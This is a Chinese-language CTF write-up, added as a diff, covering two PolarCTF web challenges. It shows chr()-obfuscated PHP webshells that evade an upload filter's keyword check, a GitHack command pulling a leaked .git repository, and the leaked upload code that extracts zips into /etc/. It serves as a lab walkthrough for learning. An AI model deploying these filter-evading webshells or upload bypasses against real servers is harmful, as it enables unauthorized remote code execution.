@@ -285,3 +285,82 @@ zip:///path/to/archive.zip#innerfile 表示：打开 /path/to/archive.zip 这个
 zip://upload/xxx.jpg#shell
 意思是：打开 upload/xxx.jpg（它是一个 zip 格式的压缩包），取出里面的 shell 文件。
 ```
+
+**GET**
+
+又是文件上传，其实现在这种单一考点已经很少的，更接近于实际的渗透或者cve，这里测试了一下应该是黑名单，可以双写绕过，但是还会对文本内容进行检测：
+
+<img width="1948" height="517" alt="image" src="https://github.com/user-attachments/assets/2dd6ee40-b2e8-4525-a018-b4cdc4f89abf" />
+
+直接输入post这样的会被检测出来，那么看一下chr转换之后能不能绕过：
+```
+<?php
+$f = chr(101).chr(118).chr(97).chr(108);
+$p = chr(95).chr(80).chr(79).chr(83).chr(84);
+$c = chr(99).chr(109).chr(100);
+@$f($$p[$c]);
+?>
+```
+<img width="1963" height="645" alt="image" src="https://github.com/user-attachments/assets/c4fd8cdf-7e22-4cbb-a266-4624a7aab783" />
+
+可以看到也是上传成功，但是连接蚁剑却连不上，浏览器里看一下也是500，那么很可能是没有被正确解析吧，那就不连蚁剑了按照视频里的来：
+```
+<?php
+$func = chr(115).chr(121).chr(115).chr(116).chr(101).chr(109);
+$cmd='';
+$cmd_chars = [108,115];  #ls
+foreach($cmd_chars as $ascii) {
+    $cmd .= chr($ascii);
+}   #动态构造命令
+@$func($cmd);
+?>
+```
+<img width="2767" height="295" alt="image" src="https://github.com/user-attachments/assets/7a8e48dc-8024-4b1d-ae4d-f5b171221d6f" />
+
+可以看到这里就是我们之前上传的一些文件，然后看一下根目录，里面修改一下就行，那么再回到/var/www/html目录下，看到有几个文件：
+
+<img width="2138" height="346" alt="image" src="https://github.com/user-attachments/assets/a62d7908-8f3d-48a8-b99c-7d0257b1e7ec" />
+
+读取一下robot.txt,看到一个感觉很莫名其妙的话：_If it won't open, maybe try including each other and see._
+
+视频里面说是相互包含，两个文件先取一个为路径，然后再?file-另一个文件路径，好抽象...
+
+<img width="2886" height="652" alt="image" src="https://github.com/user-attachments/assets/0f2c2e17-0dab-4e40-b57f-aebe34b4b883" />
+
+**狗黑子最后的起舞**
+
+开始就一个界面其他啥都没有，扫个目录，发现登录和注册框，进去之后看到路径变了：
+
+<img width="2210" height="325" alt="image" src="https://github.com/user-attachments/assets/235c9a41-d795-4532-8327-b322cf478fa2" />
+
+但是其他也啥都没有，学到一个知识，遇事不决扫目录，第一次碰到要扫两次目录的，发现了好多/.git路径下的，说明存在源码泄露，使用工具githack：
+```
+python GitHack.py http://97dcd1c2-ca10-4458-b16a-597eb9914570.www.polarctf.com:8090/ghzpolar/.git/
+```
+成功拿到了gouheizi.php:
+```
+if (isset($_FILES['file'])) {
+    $f = $_FILES['file'];
+    if ($f['error'] === UPLOAD_ERR_OK) {
+        // 上传到 /etc/ 目录，文件名格式：时间戳_原文件名
+        $dest = '/etc/' . time() . '_' . basename($f['name']);
+        
+        if (move_uploaded_file($f['tmp_name'], $dest)) {
+            $escapedDest = escapeshellarg($dest);
+            // 解压 ZIP 文件到 /etc/ 目录
+            exec("unzip -o $escapedDest -d /etc/ 2>&1");
+            // 这里有个奇怪的重复执行（可能是代码冗余）
+            if ($code !== 0) {
+                exec("unzip -o $escapedDest -d /etc/ 2>&1");
+            }
+            // 删除上传的 ZIP 文件
+            unlink($dest);
+            echo "ghz";
+        }
+    }
+}
+```
+
+
+
+
